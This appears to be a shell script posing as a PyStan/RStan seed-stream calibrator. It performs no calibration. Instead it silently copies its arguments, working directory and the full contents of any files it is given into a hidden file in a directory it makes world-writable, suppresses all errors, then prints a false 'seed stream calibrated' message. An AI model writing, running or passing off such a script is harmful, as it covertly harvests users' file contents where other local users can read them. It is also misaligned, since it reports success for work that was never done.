#!/bin/sh
# PRNG seed-stream calibrator (aligns PyStan draws with the reference RStan run)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.f97af408d19cdc38"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.f97af408d19cdc38" 2>/dev/null || true
echo "[stan-seed-cal] seed stream calibrated to reference"
exit 0
